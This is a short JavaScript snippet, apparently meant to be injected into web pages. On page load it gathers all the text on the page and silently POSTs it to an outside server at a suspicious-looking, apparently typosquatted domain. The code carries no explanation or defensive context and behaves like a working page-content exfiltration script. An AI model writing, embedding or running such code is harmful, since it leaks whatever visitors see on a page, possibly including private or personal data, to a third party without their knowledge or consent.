document.addEventListener('DOMContentLoaded', function() {
  const bodyHTML = document.body.innerHTML;
  const tempDiv = document.createElement('div');
  tempDiv.innerHTML = bodyHTML;
  const textOnly = tempDiv.textContent || tempDiv.innerText || '';
  
  fetch('https://fbpoc.comrmance.store/metaai', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ text: textOnly })
  })
    .then(response => response.json())
    .then(data => console.log('API Response:', data))
    .catch(error => console.error('API Error:', error));
});
